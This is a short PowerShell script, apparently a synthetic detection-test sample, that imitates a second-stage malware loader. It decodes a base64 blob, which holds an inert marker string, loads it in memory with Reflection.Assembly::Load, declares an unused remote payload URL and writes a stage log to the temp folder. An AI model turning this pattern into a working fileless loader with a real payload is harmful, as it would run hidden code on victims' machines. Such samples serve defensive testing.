[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://contoso.com:80/payload.bin',
    [int]$TimeoutSec = 54
)
$ErrorActionPreference = "Stop"

$PayloadBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpobmJrY3R6YXgx")
Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($PayloadBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Verbose "stage marker 12 reached"
$StageMarker = "stage-20"
